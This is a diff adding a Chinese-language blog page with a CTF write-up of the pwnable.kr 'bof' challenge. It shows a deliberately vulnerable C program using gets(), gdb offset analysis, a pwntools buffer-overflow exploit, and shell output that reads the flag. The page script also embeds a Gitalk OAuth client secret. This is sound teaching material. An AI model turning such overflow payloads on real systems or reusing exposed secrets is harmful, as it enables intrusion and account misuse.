@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="Purse the balance of everything.">
+  <meta name="keywords" content="CTF, Blog">
+  
+    <link rel="icon" href>
+  
+    
+  <title>从零开刷PWNABLE.KR系列-bof | Mads Blog</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/css/my.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/gitalk.css">
+  <script src="/lib/gitalk.min.js"></script>
+  <link href="https://cdn.bootcss.com/font-awesome/5.7.0/css/all.css" rel="stylesheet">
+
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <i class="fas fa-cat" style="margin-right: 10px"></i>
+      <span>Mads Blog</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content aath-body">
+          <h1>从零开刷PWNABLE.KR系列-bof</h1>
+          
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019年02月21日</time>
+            
+            
+              | 
+                  <i class="fa fa-tags" aria-hidden="true"></i>
+                
+               
+  <a href="/tags/#CTF" class='tag'>CTF</a>
+
+  <a href="/tags/#PWN" class='tag'>PWN</a>
+
+  <a href="/tags/#PWNABLE.KR" class='tag'>PWNABLE.KR</a>
+
+
+            
+            | <i class="fas fa-edit" aria-hidden="true"></i> <time>2019年02月21日</time>
+          </div>
+          
+          <p>今天开刷第三道题bof, 遇到个小坑就是题目有buffer, 导致好久我都以为题目炸了hhh. 虽然还是很简单的入门题, 但是也做了挺久的, 哎tcl.</p>
+<h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>Nana told me that buffer overflow is one of the most common software vulnerability.<br>Is that true?</p>
+<p>Download : <a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a><br>Download : <a href="http://pwnable.kr/bin/bof.c" target="_blank" rel="noopener">http://pwnable.kr/bin/bof.c</a></p>
+<p>Running at : nc pwnable.kr 9000</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>这次是远程打, 但是也给了源码, 下载得到源码: </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">        gets(overflowme);       <span class="comment">// smash me!</span></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">                system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>func</code>函数存在危险函数<code>gets</code>, 于是思路就是利用这个溢出覆盖<code>key</code>这个形参为<code>0xcafebabe</code>即可拿到shell. 首先检查一下开了哪些保护, </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># checksec bof</span></span><br><span class="line">[*] <span class="string">'/root/learning/pwn/pwnable.kr/bof/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<p>发现所有保护基本都开了, 但是对于这题来说, 有阻碍的应该只是<code>Canary</code>这个保护. 但是测试一下会发现， <code>Canary</code>的检查是在函数即将返回时, 所以对于我们这题来说没有阻碍. 这题麻烦之处在于<code>Canary</code>的存在, 我们没法直接利用塞满栈的形式计算出溢出点到要覆盖变量到偏移. 于是我就只能打开gdb, 动态调试手工计算偏移.</p>
+<p>打开gdb, 载入gef插件方便观看, 在<code>func</code>处下个断点<code>ni</code>单步调试,</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb -q bof</span></span><br><span class="line">Reading symbols from bof...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) <span class="built_in">source</span> ~/.gdbinit-gef.py</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">' to start, `gef config'</span> to configure</span><br><span class="line">70 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 3 commands could not be loaded, run `gef missing` to know why.</span><br><span class="line">gef➤  b func</span><br><span class="line">Breakpoint 1 at 0x632</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/learning/pwn/pwnable.kr/bof/bof</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x56555632 <span class="keyword">in</span> func ()</span><br></pre></td></tr></table></figure>
+<p>跑到<code>gets</code>函数传参的地方停下, 查看<code>overflowme</code>变量的地址, </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  0x56555637 &lt;func+11&gt;        add    BYTE PTR [ecx-0x3fce0bbb], cl</span><br><span class="line">  0x5655563d &lt;func+17&gt;        mov    DWORD PTR [esp], 0x5655578c</span><br><span class="line">  0x56555644 &lt;func+24&gt;        call   0xf7e61ca0 &lt;puts&gt;</span><br><span class="line">→ 0x56555649 &lt;func+29&gt;        lea    eax, [ebp-0x2c]</span><br><span class="line">  0x5655564c &lt;func+32&gt;        mov    DWORD PTR [esp], eax</span><br><span class="line">  0x5655564f &lt;func+35&gt;        call   0xf7e613e0 &lt;gets&gt;</span><br><span class="line">  0x56555654 &lt;func+40&gt;        cmp    DWORD PTR [ebp+0x8], 0xcafebabe</span><br><span class="line">  0x5655565b &lt;func+47&gt;        jne    0x5655566b &lt;func+63&gt;</span><br><span class="line">  0x5655565d &lt;func+49&gt;        mov    DWORD PTR [esp], 0x5655579b</span><br></pre></td></tr></table></figure>
+<p>地址就存在<code>eax</code>寄存器中.继续<code>ni</code>单步, 在运行到关键的<code>if</code>判断处停下来, </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  0x56555648 &lt;func+28&gt;        mov    eax, ds:0x89d4458d</span><br><span class="line">  0x5655564d &lt;func+33&gt;        add    al, 0x24</span><br><span class="line">  0x5655564f &lt;func+35&gt;        call   0xf7e613e0 &lt;gets&gt;</span><br><span class="line">→ 0x56555654 &lt;func+40&gt;        cmp    DWORD PTR [ebp+0x8], 0xcafebabe</span><br><span class="line">  0x5655565b &lt;func+47&gt;        jne    0x5655566b &lt;func+63&gt;</span><br><span class="line">  0x5655565d &lt;func+49&gt;        mov    DWORD PTR [esp], 0x5655579b</span><br><span class="line">  0x56555664 &lt;func+56&gt;        call   0xf7e3cda0 &lt;system&gt;</span><br><span class="line">  0x56555669 &lt;func+61&gt;        jmp    0x56555677 &lt;func+75&gt;</span><br><span class="line">  0x5655566b &lt;func+63&gt;        mov    DWORD PTR [esp], 0x565557a3</span><br></pre></td></tr></table></figure>
+<p>发现是将<code>ebp+0x8</code>地址处的值与<code>0xcafebabe</code>比较, 即<code>key</code>变量的地址. 再将<code>overflowme</code>变量地址(eax寄存器)与<code>ebp+0x8</code>的值相减即可得到偏移.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info reg eax</span><br><span class="line">eax            0xffffd43c	0xffffd43c</span><br><span class="line">gef➤  info reg ebp</span><br><span class="line">ebp            0xffffd468	0xffffd468</span><br></pre></td></tr></table></figure>
+<p>得到偏移量为<code>0xffffd468 + 0x8 - 0xffffd43c=52</code>, 利用<code>pwntools</code>工具包编写exp如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./bof')</span></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">52</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行getshell获得flag.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./go.py                                                                                                                                                                                                 127 ↵</span></span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">[DEBUG] Sent 0x39 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000030  41 41 41 41  be ba fe ca  0a                        │AAAA│····│·│</span><br><span class="line">    00000039</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    <span class="string">'cat flag\n'</span></span><br><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    <span class="string">'daddy, I just pwned a buFFer :)\n'</span></span><br><span class="line">daddy, I just pwned a buFFer :)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+          
+<div class="post-copyright">
+<p><span>本文标题：</span>从零开刷PWNABLE.KR系列-bof</p>
+<p><span>文章作者：</span>Mads</p>
+<p><span>发布时间：</span>2019/02/21 12:00:00</p>
+<p><span>更新时间：</span>2019/02/21 08:15:35</p>
+<p><span>原始链接：</span><a style="color: #bababa" href=" + data.permalink + ">http://lxzmads.github.io/2019/02/21/从零开刷PWNABLE.KR系列-bof/</a></p>
+<p><span>许可协议：</span><i class="fab fa-creative-commons"></i><a rel="license" style="color: #bababa" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a><span class="warn">转载请保留原文链接及作者</span></p>
+</div>
+ 
+        </section>
+    </article>
+    
+    <div class="comment">
+        <div id="gitalk-container"></div>
+    </div>
+    
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bof"><span class="toc-number">1.</span> <span class="toc-text">bof</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.1.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<script type="text/javascript">
+const gitalk = new Gitalk({
+  clientID: "6ae565c159db15a6167c",
+  clientSecret: '6b81331560c108209346bc4807a5126da190e14c',
+  repo: 'blogcomments',
+  owner: 'lxzmads',
+  admin: ['lxzmads'],
+  id: decodeURI(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath-魔改版 by Mads</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/lib/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
